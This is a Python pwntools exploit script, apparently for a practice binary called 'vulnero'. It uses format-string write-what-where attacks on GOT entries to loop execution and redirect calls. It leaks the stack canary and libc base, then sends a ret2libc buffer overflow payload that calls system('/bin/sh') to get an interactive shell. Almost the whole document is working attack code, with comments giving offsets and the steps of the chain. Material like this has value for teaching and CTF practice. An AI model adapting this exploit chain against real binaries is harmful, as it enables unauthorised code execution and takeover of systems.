#!/usr/bin/python

#-----------------------------------------------#
# Arch: x86                                     #
# Protections: NX, ASLR, Canary, Partial RELRO  #
# Vuln Type: format strings exploitation        #
# OS: Kali Linux 5.10.0-kali9-amd64             #
#-----------------------------------------------#

# -----------------------------> DESCRIPTION <----------------------------------------------------------------

# 1) Write-What-Where to link the end of strings() to its beginning (looping through it)
# 2) Performing a memory leak through format strings on the Canary value and an address with costant
# offset from the libc base address. Then retrieving libc base address from that address.
# 3) Write-What-Where on read() GOT entry in strings() to jump from strings() to stack()
# 4) Stack() is vulnerable to a stack-based buffer overflow. Building ROP chain and calling system('/bin/sh').

# -----------------------------> NOTES <---------------------------------------------------------------------

# canary value originally at 39th position with data direct access
# constant value from libc base originally at 41st position --> original offset from libc base address: 0x974c

# NOTE: The first Write-What-Where causes positions to change --> add 4 to all position
# new canary value at 43rd position
# new constant at 45th position --> new offset from libc base address: 0xbaac

from pwn import *
from time import sleep


def loop_strings():
    
    # FIRST WRITE-WHAT-WHERE
    # overwriting exit() GOT entry with strings() --> looping through strings()
    # in order to exploit format strings multiple times

    print "[+] Performing first Write-What-Where"
    sleep(1)

    where_low = (0x804c020)
    where_high = where_low + 2

    # what: 0X80492db (strings())

    payload = ""
    payload += p32(where_low)
    payload += p32(where_high)

    count_low = 0x92db - len(payload)

    payload += "%" + str(count_low) + "p"
    payload += "%5$hn"

    count_high = 0x010804 - 0x92db

    payload += "%" + str(count_high) + "p"
    payload += "%6$hn"

    r.sendline("2")     # select option 2 for strings()
    r.recvline()
    r.sendline(payload)
    memory_leak()


def memory_leak():

    # Leaking canary value and libc base address

    print "[+] Leaking Canary value + Libc base address"
    sleep(1)

    global canary, libc_base
    
    r.recvline()
    r.recvline()
    r.sendline("%43$lx|%45$lx")

    leaks = r.recvline().replace("\n", "").split("|")
    canary = int(leaks[0], 16)
    libc_base = (int(leaks[1], 16) - 0xbaac)
    log.info("canary value leaked: {}".format(hex(canary)))
    log.info("libc_base leaked: {}".format(hex(libc_base)))
    sleep(1)
    
    shift_stack()


#---------------------------------------------------------#

def shift_stack():

    # SECOND WRITE-WHAT-WHERE
    # overwriting read() GOT entry with stack() --> stack() is affected
    # by a stack-based buffer overflow

    print "[+] Performing second Write-What-Where"
    sleep(1)

    where_low_1 = (0x804c00c)
    where_high_1 = where_low_1 + 2

    # what: 0x8049267 (stack())

    payload = ""
    payload += p32(where_low_1)
    payload += p32(where_high_1)

    count_low_1 = 0x9267 - len(payload)

    payload += "%" + str(count_low_1) + "p"
    payload += "%5$hn"

    count_high_1 = 0x010804 - 0x9267

    payload += "%" + str(count_high_1) + "p"
    payload += "%6$hn"

    r.sendline(payload)
    r.recvline()

    rop_chain()

#--------------------------#

def rop_chain():
    
    # offset from canary: 140
    # overall offset: 156

    print "[+] Building ROP chain... Executing /bin/sh"
    sleep(2)

    system = (libc_base + 0x44cc0)
    ret_exit = (libc_base + 0x37640)
    arg_sh = (libc_base + 0x18fb62)

    rop = "A"*140
    rop += p32(canary)
    rop += "A"*12
    rop += p32(system)
    rop += p32(ret_exit)
    rop += p32(arg_sh)

    r.sendline(rop)
    r.interactive()

def main():
    
    global r
    r = process('./vulnero')
    r.recv()
    loop_strings()

if __name__ == "__main__":
    main()
